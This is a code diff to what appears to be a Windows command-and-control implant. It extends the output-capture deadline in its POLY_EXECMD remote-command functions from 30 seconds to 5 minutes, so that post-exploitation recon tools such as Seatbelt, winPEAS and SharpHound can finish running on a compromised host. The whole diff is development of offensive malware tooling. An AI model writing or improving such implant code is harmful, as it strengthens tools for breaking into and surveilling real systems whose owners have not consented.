@@ -60,6 +60,13 @@
 #ifndef LT_C2_JITTER_MAX
 #define LT_C2_JITTER_MAX 30000
 #endif
+/* Hard deadline for child-process output capture.
+ * Heavy recon tools (Seatbelt -group=all, winPEAS, SharpHound) can take 3–5 min.
+ * 30 s killed them before any output was written. 300 s covers all common tools;
+ * fast commands (whoami, ipconfig) finish in ms and are unaffected by this value. */
+#ifndef LT_CMD_TIMEOUT_MS
+#define LT_CMD_TIMEOUT_MS 300000
+#endif
 
 #include <windows.h>
 #include <winternl.h>
@@ -2166,7 +2173,8 @@ static PBYTE POLY_EXECMD_DIRECT(const char *cmd, DWORD *outlen) {
         hR=_hR2;
     }
 
-    /* Drain output with 30s deadline (same logic as POLY_EXECMD) */
+    /* Drain output — LT_CMD_TIMEOUT_MS deadline (5 min default).
+     * Heavy tools (Seatbelt, winPEAS) need 3–5 min; fast commands exit immediately. */
     PBYTE buf=NULL; DWORD total=0; BYTE tmp[4096]; DWORD rd;
     {
         DWORD t0=GetTickCount(); int fini=0;
@@ -2183,7 +2191,7 @@ static PBYTE POLY_EXECMD_DIRECT(const char *cmd, DWORD *outlen) {
             }
             if(fini) break;
             if(WaitForSingleObject(pi.hProcess,0)==WAIT_OBJECT_0) break;
-            if(GetTickCount()-t0>=30000){TerminateProcess(pi.hProcess,1);WaitForSingleObject(pi.hProcess,2000);break;}
+            if(GetTickCount()-t0>=LT_CMD_TIMEOUT_MS){TerminateProcess(pi.hProcess,1);WaitForSingleObject(pi.hProcess,2000);break;}
             Sleep(50);
         }
         while(ReadFile(hR,tmp,sizeof(tmp),&rd,NULL)&&rd>0){
@@ -2289,8 +2297,8 @@ static PBYTE POLY_EXECMD(const char *cmd, DWORD *outlen) {
      * so ReadFile never blocks.  WaitForSingleObject(proc,0) checks exit without
      * blocking.  This prevents hanging on commands that spawn an interactive shell
      * (e.g. "cmd") — those never close the write end of the pipe, so the old
-     * blocking ReadFile loop would wait forever.  30-second hard deadline kills
-     * the child and lets the agent return to polling.
+     * blocking ReadFile loop would wait forever.  LT_CMD_TIMEOUT_MS hard deadline
+     * kills the child and lets the agent return to polling.
      */
     PBYTE buf=NULL; DWORD total=0; BYTE tmp[4096]; DWORD rd;
     {
@@ -2308,7 +2316,7 @@ static PBYTE POLY_EXECMD(const char *cmd, DWORD *outlen) {
             }
             if(fini) break;
             if(WaitForSingleObject(pi.hProcess,0)==WAIT_OBJECT_0) break;
-            if(GetTickCount()-t0>=30000){
+            if(GetTickCount()-t0>=LT_CMD_TIMEOUT_MS){
                 TerminateProcess(pi.hProcess,1);
                 WaitForSingleObject(pi.hProcess,2000);
                 break;
